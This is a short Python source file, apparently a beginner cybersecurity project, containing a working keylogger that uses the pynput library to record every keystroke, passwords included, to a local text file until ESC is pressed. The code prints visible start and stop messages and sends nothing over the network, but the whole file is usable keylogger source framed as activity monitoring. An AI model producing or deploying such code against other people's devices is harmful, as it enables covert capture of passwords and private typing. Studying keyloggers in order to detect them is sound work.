# -*- coding: utf-8 -*-
"""
Created on Mon Jan 27 09:06:43 2025

@author: Sirajudin
"""
"""
Keylogger is the best cybersecurity beginner-level project. 
Keylogger is software installed on your computer to record every keystroke you type, 
including passwords. The main goal of this project is to Keep an eye on the user’s activity 
to notice any suspicious or threatening activities on the devices.
"""
from pynput import keyboard

# File to store logged keys
log_file = "key_log.txt"

def on_press(key):
    try:
        # Log alphanumeric keys
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Log special keys (e.g., shift, ctrl, etc.)
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

def on_release(key):
    # Stop keylogger when 'ESC' is pressed
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

# Create a listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press ESC to stop.")
    listener.join()
